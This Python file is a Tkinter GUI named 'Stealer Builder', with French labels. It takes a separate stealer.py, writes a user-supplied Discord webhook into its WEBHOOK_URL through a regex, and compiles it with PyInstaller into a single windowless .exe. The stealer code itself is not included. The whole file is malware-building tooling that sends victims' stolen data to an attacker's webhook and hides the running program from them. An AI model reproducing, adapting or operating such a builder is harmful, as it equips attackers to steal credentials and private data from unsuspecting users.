# 451-builder-v1 - Description rapide du programme.
# Copyright (C) 2026 uhqtools-on
# This file is part of 451-builder-v1.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see https://www.gnu.org/licenses/.


import os
import re
import shutil
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from pathlib import Path
import threading

OUTPUT_DIR = Path("output")
STEALER = Path("stealer.py")
BUILD_DIR = Path("build_tmp")


class Builder(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Stealer Builder")
        self.geometry("640x480")
        self.resizable(False, False)

        ttk.Label(self, text="Nom du .exe :", font=("Segoe UI", 11)).pack(pady=(20, 5))
        self.name_entry = ttk.Entry(self, width=45)
        self.name_entry.insert(0, "stealer")
        self.name_entry.pack()

        ttk.Label(self, text="Webhook Discord :", font=("Segoe UI", 11)).pack(pady=(15, 5))
        self.webhook_entry = ttk.Entry(self, width=70)
        self.webhook_entry.insert(0, "https://discord.com/api/webhooks/...")
        self.webhook_entry.pack()

        ttk.Button(self, text="Build", command=self.build).pack(pady=18)

        self.log = scrolledtext.ScrolledText(self, height=13, width=80)
        self.log.pack(pady=10)

    def log_msg(self, msg):
        self.log.insert(tk.END, msg + "\n")
        self.log.see(tk.END)
        self.update_idletasks()

    def build(self):
        name = self.name_entry.get().strip()
        webhook = self.webhook_entry.get().strip()

        if not name:
            messagebox.showerror("Erreur", "Donne un nom au .exe")
            return
        if not webhook.startswith("https://discord.com/api/webhooks/"):
            if not messagebox.askyesno("Attention", "Le webhook ne ressemble pas à un webhook Discord. Continuer ?"):
                return
        if not STEALER.exists():
            messagebox.showerror("Erreur", "stealer.py introuvable à côté du builder")
            return

        threading.Thread(target=self._build, args=(name, webhook), daemon=True).start()

    def _build(self, name, webhook):
        try:
            BUILD_DIR.mkdir(exist_ok=True)
            OUTPUT_DIR.mkdir(exist_ok=True)

            self.log_msg("[+] Injection du webhook dans le stealer...")
            src = STEALER.read_text(encoding="utf-8")
            src = re.sub(r'WEBHOOK_URL\s*=\s*".*?"',
                         f'WEBHOOK_URL = "{webhook}"', src)
            tmp_script = BUILD_DIR / "stealer_build.py"
            tmp_script.write_text(src, encoding="utf-8")

            self.log_msg("[+] Compilation avec PyInstaller (patiente ~30s)...")
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name", name,
                "--distpath", str(OUTPUT_DIR),
                "--workpath", str(BUILD_DIR / "work"),
                "--specpath", str(BUILD_DIR),
                str(tmp_script),
            ]
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            for line in proc.stdout:
                self.log_msg(line.rstrip())
            proc.wait()

            exe = OUTPUT_DIR / f"{name}.exe"
            if exe.exists():
                self.log_msg(f"\n[OK] Exe généré : {exe.resolve()}")
                messagebox.showinfo("Succès", f"Exe créé :\n{exe.resolve()}")
            else:
                self.log_msg("\n[!] Echec : exe introuvable.")
                messagebox.showerror("Echec", "L'exe n'a pas été généré. Regarde les logs.")
        except Exception as e:
            self.log_msg(f"\n[ERREUR] {e}")
            messagebox.showerror("Erreur", str(e))


if __name__ == "__main__":
    Builder().mainloop()